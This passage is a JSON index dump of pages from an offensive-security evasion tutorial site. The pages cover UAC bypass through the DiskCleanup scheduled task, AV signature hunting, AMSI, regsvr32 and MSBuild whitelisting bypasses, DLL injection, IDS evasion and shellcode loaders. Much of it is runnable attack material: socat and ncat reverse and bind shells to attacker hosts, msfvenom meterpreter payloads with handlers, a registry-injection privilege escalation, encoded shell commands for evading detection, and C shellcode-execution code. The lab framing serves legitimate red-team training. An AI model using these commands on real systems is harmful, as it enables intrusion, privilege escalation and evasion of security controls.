    "c": "Bypassing Always Notify  On default Windows configurations, applications related to the system’s configuration to bypass UAC can be used as most of these apps have the autoElevate flag set on their manifests. But if UAC is configured on the “Always Notify” level, fodhelper and similar apps won’t be of any use as they will require the user to go through the UAC prompt to elevate. This prevents several known bypass methods. Scheduled tasks are an exciting target. By design, they are meant to be run without any user interaction (independent of the UAC security level), so asking the user to elevate a process manually is not an option. Any scheduled tasks that require elevation will automatically get it without going through a UAC prompt. The Disk Cleanup Scheduled Task is configured to run with the Users account, which means it will inherit the privileges from the calling user. The Run with highest privileges option will use the highest privilege security token available to the calling user, which is a high IL token for an administrator. If a regular non-admin user invokes this task, it will execute with medium IL only since that is the highest privilege token available to non-admins, and a bypass would not work. But … the task can be run on-demand, executing the following command when invoked: %windir%\\system32\\cleanmgr.exe /autoclean /d %systemdrive% The command depends on environment variables, and it may be possible to inject commands through them and get them executed by starting the DiskCleanup task manually. The %windir% variable can be overridden through the registry by creating an entry in HKCU\\Environment . To execute a reverse shell using socat: cmd.exe /c C:\\tools\\socat\\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM &REM (ending with a blank space) is concatenated at the end to comment whatever is put after %windir% when expanding the environment variable to get the final command used by DiskCleanup. Lab  Disable Windows Defender set up a listener for a reverse shell with nc: nc -lvp 4446 Connect to the backdoor provided on port 9999: nc MACHINE_IP 9999 Write the payload to %windir% and then execute the DiskCleanup task: C:\\> reg add \"HKCU\\Environment\" /v \"windir\" /d \"cmd.exe /c C:\\tools\\socat\\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM \" /f C:\\> schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I In the shell with high IL, get the flag: $ nc -lvp 4446 Listening on 0.0.0.0 4446 Connection received on 10.10.183.127 25631 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami /groups | find \"Label\" Mandatory Label\\High Mandatory Level Label S-1-16-12288 C:\\flags\\GetFlag-diskcleanup.exe Clean up reg delete \"HKCU\\Environment\" /v \"windir\" /f",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ae57bbf3b2790e8471a32a56cf00c5a3",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/nextgen",
    "t": "Next-Generation firewalls ",
    "c": "Next-Generation firewalls  Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. If you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use o f encryption, for example, via SSL/TLS. Next-Generation Firewall (NGFW) is designed to handle the new challenges facing modern enterprises. For example, some of NGFW capabilities include: Integrate a firewall and a real-time Intrusion Prevention System (IPS) . It can stop detected threats in real-time. Identify users and their traffic. It can enforce the security policy per-user or per-group basis. Identify the applications and protocols regardless of the port number being used. Identify the content being transmitted. It can enforce the security policy in case any violating content is detected. Ability to decrypt SSL/TLS and SSH traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files. A properly configured and deployed NGFW renders many attacks useless.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d3eade7ab585d79a2415abb19adc573e",
    "u": "https://evasion.tymyrddin.dev/docs/land/sysinternals",
    "t": "Windows sysinternals ",
    "c": "Windows sysinternals  Windows Sysinternals is a set of tools and advanced system utilities developed to help IT professionals manage, troubleshoot, and diagnose the Windows operating system in advanced topics. The Sysinternals Suite includes: Disk management Process management Networking tools System information Security tools While built-in and Sysinternals tools are helpful for system administrators, these tools are also used by hackers, malware developers, and pentesters due to the inherent trust they have within the operating system. Due to the increase of adversaries and malware creators using these tools nowadays, the blue team is aware of possible malicious uses and has implemented defensive controls against most of them. Resources  Sysinternals Suite Sysinternals Resources",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "742aaa17aa4c0bcc57e358b72343189a",
    "u": "https://evasion.tymyrddin.dev/docs/signature/identification",
    "t": "Signature identification ",
    "c": "Signature identification  Identifying signatures, whether manually or automated, involves employing an iterative process to determine what byte a signature starts at. Recursively splitting a compiled binary in half and testing it, gives a rough estimate of a byte-range to investigate further. Signature identification can be automated using scripts to split bytes over an interval. Find-AVSignature will split a provided range of bytes through a given interval. This script relieves a lot of the manual work, but still has several limitations. It still requires an appropriate interval to be set to function properly and will also only observe strings of the binary when dropped to disk rather than scanning using the full functionality of the antivirus engine. Alternatives are other FOSS tools that leverage the engines themselves to scan the file, including DefenderCheck, ThreatCheck , and AMSITrigger . ThreatCheck  ThreatCheck is a fork of DefenderCheck and is the most widely used of the three. To identify possible signatures, ThreatCheck leverages several antivirus engines against split compiled binaries and reports where it believes bad bytes are present. ThreatCheck does not provide a pre-compiled release. C:\\>ThreatCheck.exe --help -e, --engine (Default: Defender) Scanning engine. Options: Defender, AMSI -f, --file Analyze a file on disk -u, --url Analyze a file from a URL --help Display this help screen. --version Display version information. AMSITrigger  AMSI leverages the runtime, making signatures harder to identify and resolve, and supports some file types which ThreatCheck does not, like Powershell. AMSITrigger will scan functions against a provided PowerShell script and report any specific sections of code it believes need to be alerted on. AMSITrigger provides a pre-compiled release on GitHub. C:\\>amsitrigger.exe --help -i, --inputfile=VALUE Powershell filename -u, --url=VALUE URL eg. <https://10.1.1.1/Invoke-NinjaCopy.ps1> -f, --format=VALUE Output Format: 1 - Only show Triggers 2 - Show Triggers with Line numbers 3 - Show Triggers inline with code 4 - Show AMSI calls (xmas tree mode) -d, --debug Show Debug Info -m, --maxsiglength=VALUE Maximum signature Length to cater for, default=2048 -c, --chunksize=VALUE Chunk size to send to AMSIScanBuffer, default=4096 -h, -?, --help Show Help Lab  -e Defender gave errors. -e AMSI worked, and gave answers to Task 3 and Task 2 (rounding 50500 to 51000). C:\\Users\\Student\\Desktop\\Tools>.\\ThreatCheck.exe -f C:\\Users\\Student\\Desktop\\Binaries\\shell.exe -e AMSI [+] Target file size: 73802 bytes [+] Analyzing... [*] Testing 36901 bytes [*] No threat found, increasing size ... [*] Testing 50503 bytes [*] Threat found, splitting [*] Testing 50500 bytes [*] Threat found, splitting [!] Identified end of bad bytes at offset 0xC544 00000000 95 CE 77 FF D5 90 E9 09 00 00 00 3C 7E 5F 66 24 ?IwÿO?é····<~_f$ 00000010 8C 09 80 09 31 C0 E9 09 00 00 00 14 4A C5 E1 9B ?·?·1Aé·····JÅá? 00000020 26 A5 81 BE 64 FF 30 90 64 89 20 90 E9 09 00 00 &¥?_dÿ0?d? ?é··· 00000030 00 EF 4F E2 4F 7A FE 36 F1 04 FF D3 90 E9 24 FF ·ïOâOz_6ñ·ÿO?é$ÿ 00000040 FF FF E8 E4 FE FF FF FC E8 8F 00 00 00 60 31 D2 ÿÿèä_ÿÿüè?···`1O 00000050 89 E5 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 0F ?åd?R0?R·?R·?r(· 00000060 B7 4A 26 31 FF 31 C0 AC 3C 61 7C 02 2C 20 C1 CF ·J&1ÿ1A¬<a|·, AI 00000070 0D 01 C7 49 75 EF 52 8B 52 10 57 8B 42 3C 01 D0 ··ÇIuïR?R·W?B<·D 00000080 8B 40 78 85 C0 74 4C 01 D0 8B 58 20 01 D3 50 8B ?@x?AtL·D?X ·OP? 00000090 48 18 85 C9 74 3C 49 8B 34 8B 01 D6 31 FF 31 C0 H·?Ét<I?4?·Ö1ÿ1A 000000A0 AC C1 CF 0D 01 C7 38 E0 75 F4 03 7D F8 3B 7D 24 ¬AI··Ç8àuô·}o;}$ 000000B0 75 E0 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 uàX?X$·Of?·K?X·· 000000C0 D3 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A 51 O?·?·D?D$$[[aYZQ 000000D0 FF E0 58 5F 5A 8B 12 E9 80 FF FF FF 5D 68 33 32 ÿàX_Z?·é?ÿÿÿ]h32 000000E0 00 00 68 77 73 32 5F 54 68 4C 77 26 07 FF D5 B8 ··hws2_ThLw&·ÿO, 000000F0 90 01 00 00 29 C4 54 50 68 29 80 6B 00 FF D5 6A ?···)ÄTPh)?k·ÿOj [*] Run time: 638.95s C:\\Users\\Student\\Desktop\\Tools> Having identified a signature, next up is deciding how to deal with it. Depending on the strength and type of signature, it may be broken using simple obfuscation, or it may require specific investigation and remedy.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4d388c33f5076e207876b4ae1f11434e",
    "u": "https://evasion.tymyrddin.dev/docs/runtime/amsi",
    "t": "Study AMSI ",
    "c": "Study AMSI  AMSI (Anti-Malware Scan Interface) is a PowerShell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime. From Microsoft: “The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any anti-malware product that’s present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.” AMSI will determine its actions from a response code as a result of monitoring and scanning: AMSI_RESULT_CLEAN = 0 AMSI_RESULT_NOT_DETECTED = 1 AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384 AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479 AMSI_RESULT_DETECTED = 32768 These response codes will only be reported on the backend of AMSI or through third-party implementation. If AMSI detects a malicious result, it will halt execution and send an error message. PS C:Users\\Tryhackme> 'Invoke-Hacks' At line:1 char:1 + \"Invoke-Hacks\" + ~~~~~~~~~~~~~~ This script contains malicious content and has been blocked by your antivirus software. + CategoryInfo : ParserError: (:) []. ParentContainsErrorRecordException + FullyQualifiedErrorId : ScriptContainedMaliciousContent AMSI is fully integrated into the following Windows components: User Account Control, or UAC PowerShell Windows Script Host (wscript and cscript) JavaScript and VBScript Office VBA macros When targeting the above components, attackers need to be mindful of AMSI and its implementations when executing code or abusing components. The way AMSI is instrumented can be complex, including multiple DLLs and varying execution strategies depending on where it is instrumented. By definition, AMSI is only an interface for other anti-malware products; AMSI will use multiple provider DLLs and API calls depending on what is being executed and at what layer it is being executed. How data is dissected as it flows through the layers and what DLLs/API calls are being instrumented. Break down into core components. Note: AMSI is only instrumented when loaded from memory when executed from the CLR . It is assumed that if on disk MsMpEng.exe (Windows Defender) is already being instrumented. Most of the known bypasses are placed in the Win32 API layer, manipulating the AmsiScanBuffer API call. To find where AMSI is instrumented, use InsecurePowerShell, a GitHub fork of PowerShell with security features removed. Look through the compared commits and observe any security features. AMSI is only instrumented in twelve lines of code under src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs : var scriptExtent = scriptBlockAst.Extent; if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED) { var parseError = new ParseError(scriptExtent, \"ScriptContainedMaliciousContent\", ParserStrings.ScriptContainedMaliciousContent); throw new ParseException(new[] { parseError }); } if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null) { HasSuspiciousContent = true; } Resources  AMSI Bypass Methods Antimalware Scan Interface (AMSI) Antimalware Scan Interface (AMSI) functions IAmsiStream interface (amsi.h) cobbr/InsecurePowerShell Removed security features in PowerShell cobbr/PSAmsi",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "308ea0d79d4ee04eef45bf470888227c",
    "u": "https://evasion.tymyrddin.dev/docs/land/app-whitelisting",
    "t": "Application whitelisting bypasses ",
    "c": "Application whitelisting bypasses  Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an OS. Some LOLBAS examples that are used to bypass the Windows application whitelisting. Regsvr32  Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs) in the Windows Registry. The regsvr.exe binary is located at: C:\\Windows\\System32\\regsvr32.exe for the Windows 32 bits version C:\\Windows\\SysWOW64\\regsvr32.exe for the Windows 64 bits version Besides its intended use, regsvr32.exe binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting. According to Red Canary reports, the regsvr32.exe binary is the third most popular ATT&CK technique. Mitre identifies it as “System Binary Proxy Execution: Regsvr32” ( T1218.010 ). Bourne Again Shell (Bash)  In 2016, Microsoft added support for the Linux environment on Windows 10, 11, and Server 2019. This feature is known as Windows Subsystem for Linux (WSL), and it exists in two WSL versions: WSL1 and WSL2. WSL is a Hyper-V virtualised Linux distribution that runs on the OS, supporting a subset of the Linux kernel and system calls. This feature is an addon that a user can install. As part of WSL, bash.exe is a Microsoft tool for interacting with the Linux environment. By executing bash.exe -c \"path-to-payload\" , any unsigned payload can be executed. ATT&CK called this an “Indirect Command execution” technique ( T1202 ). Lab  Create a malicious DLL file using msfvenom (32 bit): $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll Set up a Metasploit listener to receive a reverse shell: $ msfconsole -q msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set LHOST ATTACKBOX_IP LHOST => ATTACKBOX_IP msf6 exploit(multi/handler) > set LPORT 443 LPORT => 443 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on ATTACKBOX_IP:443 Deliver the payload to the target machine using a webserver to serve the DLL file on our attacking machine: $ python3 -m http.server 1337 On the target machine, download the DLL file, and execute it using regsvr32.exe : c:\\Windows\\System32\\regsvr32.exe c:\\Users\\thm\\Downloads\\live0fftheland.dll Or: c:\\Windows\\System32\\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\\live0fftheland.dll /s : in silent mode (without showing messages) /n : to not call the DLL register server /i :: to use another server since we used /n /u : to run with unregister method On the attacking machine: msf6 > exploit(multi/handler) > exploit Note: For a 64-bit DLL version, specify it in the msfvenom command and run it from the victim machine using the 64bits version of regsvr32.exe at C:\\Windows\\SysWOW64\\regsvr32.exe . Resources  Red Canary Windows Subsystem for Linux (WSL)",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d5d26091f9384df5f5566b23029e53c8",
    "u": "https://evasion.tymyrddin.dev/docs/injection/dll",
    "t": "Dynamic-link library injection ",
    "c": "Dynamic-link library injection  The most common method of process injection is DLL Injection, which is popular due to how easy it is. A program can simply drop a DLL to the disk and then use “CreateRemoteThread” to call “LoadLibrary” in the target process, the loader will then take care of the rest. Locate a target process to inject ( CreateToolhelp32Snapshot() , Process32First() , and Process32Next() ). Open the target process ( GetModuleHandle , GetProcAddress , or OpenProcess ). Allocate memory region for malicious DLL ( VirtualAllocEx ). Write the malicious DLL to allocated memory ( WriteProcessMemory ). Load and execute the malicious DLL ( LoadLibraryA imported from kernel32. Once loaded, CreateRemoteThread can be used to execute memory using LoadLibrary as the starting function). Resources  MITRE: Dynamic-link library injection",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8dae6351027dd55d72520a051f64f304",
    "u": "https://evasion.tymyrddin.dev/docs/netsec/payload",
    "t": "Evasion via payload manipulation ",
    "c": "Evasion via payload manipulation  Evasion via payload manipulation includes: Obfuscating and encoding the payload. Encrypting the communication channel. Modifying the shellcode. Obfuscating and encoding the payload  Because IDS rules are very specific, minor changes to avoid detection can work. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication. Consider the command ncat -lvnp 1234 -e /bin/bash , where ncat will listen on TCP port 1234 and connect any incoming connection to the Bash shell. There are a few common transformations such as Base64, URL encoding, and Unicode escape sequence that can be applied to the command to avoid triggering IDS/IPS signatures. Encode to a Base64 format: $ cat input.txt ncat -lvnp 1234 -e /bin/bash $ base64 input.txt bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== URL encoding: $ urlencode ncat -lvnp 1234 -e /bin/bash ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash Escaped Unicode  Some applications will still process input and execute it properly if escaped Unicode is used. There are multiple ways to use escaped Unicode depending on the system processing the input string. For example, CyberChef can be used to select and configure the Escape Unicode Characters. Search for Escape Unicode Characters Drag it to the Recipe column Check-mark Encode all chars with a prefix of \\u Make sure there is a check-mark near Uppercase hex with a padding of 4 Clearly a drastic transformation that would help evade detection, assuming the target system will interpret it correctly and execute it. Using the format \\uXXXX , ncat -lvnp 1234 -e /bin/bash becomes: \\u006e\\u0063\\u0061\\u0074\\u0020\\u002d\\u006c\\u0076\\u006e\\u0070\\u0020\\u0031\\u0032\\u0033\\u0034\\u0020\\u002d\\u0065\\u0020\\u002f\\u0062\\u0069\\u006e\\u002f\\u0062\\u0061\\u0073\\u0068 Encrypting the communication channel  Because an IDS/IPS will not inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key and decrypting on the other side. One direct approach is to create the necessary encryption key on the attacker’s system and set socat to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps: Create the key Listen on the attacker’s machine Connect to the attacker’s machine Create key using openssl : $ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt $ ls thm-reverse.crt thm-reverse.key req indicates that this is a certificate signing request (not submitting it for signing). -x509 specifies an X.509 certificate -newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. -days validity in days -subj sets data, such as organization and country, via the command-line. -nodes simplifies the command and does not encrypt the private key -keyout PRIVATE_KEY specifies the filename to save the private key to -out CERTIFICATE specifies the filename to which to write the certificate request The command returns a private key thm-reverse.key and a certificate thm-reverse.crt . The Privacy Enhanced Mail (PEM) .pem file requires the concatenation of the private key .key and the certificate .crt files: cat thm-reverse.key thm-reverse.crt > thm-reverse.pem With the PEM file ready, start listening while using the key for encrypting the communication with the client: socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT On the target system, connect back: socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash Modifying the shellcode  Consider the simple case of using Ncat to create a bind shell. The command ncat -lvnp 1234 -e /bin/bash tells ncat to listen on TCP port 1234 and bind Bash shell to it. To detect packets containing such commands, think of something specific to match the signature but not too specific. So will attackers: Scanning for ncat -lvnp can be easily evaded by changing the order of the flags. On the other hand, inspecting the payload for ncat - can be evaded by adding an extra white space, such as ncat - which would still run correctly on the target system. If the IDS is looking for ncat , then simple changes to the original command are unlikely to evade detection. Consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as nc or socat. Alternatively, consider a different encoding if the target system can process it properly. Resources  section 2.4 in RFC 3986 (URL encoding: When to Encode or Decode)",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6a2cd9e1dc5446e9747860c4d36aee18",
    "u": "https://evasion.tymyrddin.dev/docs/av/generate",
    "t": "Generate shellcode ",
    "c": "Generate shellcode  Generate shellcode using public tools  Most public C2 frameworks provide their own shellcode generator compatible with the C2 platform. Of course, this is so convenient for us, but the drawback is that most, or we can say all, generated shellcodes are well-known to AV vendors and can be easily detected. $ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c The Metasploit framework generates a shellcode that executes the Windows calculator ( calc.exe ). The Windows calculator is widely used as an example in the Malware development process to show a proof of concept. If the technique works, then a new instance of the Windows calculator pops up. This confirms that any executable shellcode works with the method used. Shellcode injection  calc.c : #include <windows.h> char stager[] = { \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\" \"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\" \"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\" \"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\" \"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\" \"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\" \"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\" \"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\" \"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\" \"\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\" \"\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\" \"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\" \"\\x00\\x53\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\" }; int main() { DWORD oldProtect; VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect); int (*shellcode)() = (int(*)())(void*)stager; shellcode(); } Compile it as an .exe file: $ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe Transfer the .exe to the Windows machine and execute it. To transfer the file, for example, use smbclient: $ smbclient -U thm '//<IP target>/Tools' smb: \\> put calc-MSF.exe Generate shellcode from exe files  C2 Frameworks provide shellcode as a raw binary file .bin . If this is the case, we can use the Linux system command xxd to get the hex representation of the binary file. $ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin No encoder specified, outputting raw payload Payload size: 193 bytes $ file /tmp/example.bin /tmp/example.bin: data $ xxd -i /tmp/example.bin unsigned char _tmp_example_bin[] = { 0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 }; unsigned int _tmp_example_bin_len = 193;",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bfe279454591673a43e971f606b2cfa5",
    "u": "https://evasion.tymyrddin.dev/docs/netsec/protocol",
    "t": "Evasion via protocol manipulation ",
    "c": "Evasion via protocol manipulation  Evasion via protocol manipulation includes: Relying on a different protocol Manipulating (Source) TCP/UDP port Using session splicing (IP packet fragmentation) Sending invalid packets Rely on a different protocol  The IDS/IPS system might be configured to block certain protocols and allow others. For example, using UDP instead of TCP or relying on HTTP instead of DNS to deliver an attack or exfiltrate data. It depends on the target and the applications necessary for the target organization to design the attack. For example, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. A client relying on Google services for their business, can be attacked using Google web hosting to conceal a malicious site. Not a one-size-fits-all, and some trial and error might be necessary (do not create too much noise). In case of an IPS set to block DNS queries and HTTP requests, enforcing a policy where local machines cannot query external DNS servers but instead query the local DNS server; moreover, and enforcing secure HTTP communications while being relatively permissive when it comes to HTTPS, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS. Ncat  Ncat by default, uses a TCP connection, and can be set to use UDP using the option -u To listen using UDP (where port number is the listen port): ncat -ulvnp PORT_NUM To connect to an Ncat instance listening on a UDP port: nc -u TARGET_IP PORT_NUM Running ncat -lvnp 25 on the attacker system and connecting to it will give the impression that it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI) . Executing ncat -ulvnp 162 on the attacker machine and connecting to it will give the illusion that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI . Manipulate (Source) TCP/UDP port  The TCP and UDP source and destination ports are inspected even by the most basic security solutions. Without deep packet inspection , the port numbers are the primary indicator of the service used: network traffic involving TCP port 22 would be interpreted as SSH traffic unless the security solution can analyse the data carried by the TCP segments. Nmap  Add the option -g PORT_NUMBER (or --source-port PORT_NUMBER ) to make Nmap send all its traffic from a specific source port number. For example, use nmap -sS -Pn -g 80 -F MACHINE_IP to make the port scanning traffic appear to be exchanged with an HTTP server at first glance. When scanning UDP ports, use nmap -sU -Pn -g 53 -F MACHINE_IP to make the traffic appear to be exchanged with a DNS server. Ncat  Trying to camouflage the traffic as if it is DNS traffic: On the attacker machine, to use Ncat to listen on UDP port 53 (as a DNS server would), use ncat -ulvnp 53 . On the target, connect back to the listening server using ncat -u ATTACKER_IP 53 . To make it appear more like web traffic where clients communicate with an HTTP server: On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use ncat -lvnp 80 . On the target, connect to the listening server using nc ATTACKER_IP 80 . Use session splicing (IP packet fragmentation)  Another approach possible in IPv4 is IP packet fragmentation (session splicing). The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide the payload among multiple packets. Unless the IDS reassembles the packets, the rule won’t be triggered. Nmap  Nmap offers a few options to fragment packets. Add: -f to set the data in the IP packet to 8 bytes. -ff to limit the data in the IP packet to 16 bytes at most. --mtu SIZE to provide a custom size for data carried within the IP packet. The size should be a multiple of 8. Suppose you want to force all your packets to be fragmented into specific sizes. In that case, consider using a program such as Fragroute . It can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with ip_frag SIZE to fragment the IP data according to the provided size. The size must be a multiple of 8 . For example, you can create a configuration file fragroute.conf with one line, ip_frag 16 , to fragment packets where IP data fragments do not exceed 16 bytes. Then run the command fragroute -f fragroute.conf HOST . The HOST is the destination to which to send the fragmented packets to. Sending invalid packets  The response of systems to valid packets tends to be predictable. It can be unclear how systems will respond to invalid packets. For example, an IDS/IPS might process an invalid packet, while the target system might ignore it. The exact behaviour requires some experimentation or inside knowledge. Nmap makes it possible to create invalid packets in a many ways. Two common options are to scan the target using packets that have: Invalid TCP/UDP checksum Invalid TCP flags Nmap allows for sending packets with a wrong TCP/UDP checksum using the option --badsum . An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program. Nmap also allows for sending packets with custom TCP flags, including invalid ones. The option --scanflags allows for setting flags: URG for Urgent ACK for Acknowledge PSH for Push RST for Reset SYN for Synchronize FIN for Finish To craft packets with custom fields (valid or invalid), consider a tool such as hping3 . A few example options: -t or --ttl to set the Time to Live in the IP header. -b or --badsum to send packets with a bad UDP/TCP checksum. -S , -A , -P , -U , -F , -R to set the TCP SYN , ACK , PUSH , URG , FIN , and RST flags, respectively. Resources  EV: IDS Evasion via TCP/IP Packet Manipulation",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "976093a1d03141ee0eb3153c07c0238a",
    "u": "https://evasion.tymyrddin.dev/docs/land/no-ps",
    "t": "No PowerShell ",
    "c": "No PowerShell  In 2019, Red Canary published a threat detection report stating that PowerShell is the most used technique for malicious activities. Therefore, Organisations started to monitor or block powershell.exe from being executed. As a result, adversaries find other ways to run PowerShell code without spawning it. PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code. Lab  $ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git $ ls PowerLessShell Generate a PowerShell payload: $ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.18.22.77 LPORT=4444 -f psh-reflection > liv0ff.ps1 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 929 bytes Final size of psh-reflection file: 3787 bytes $ ls 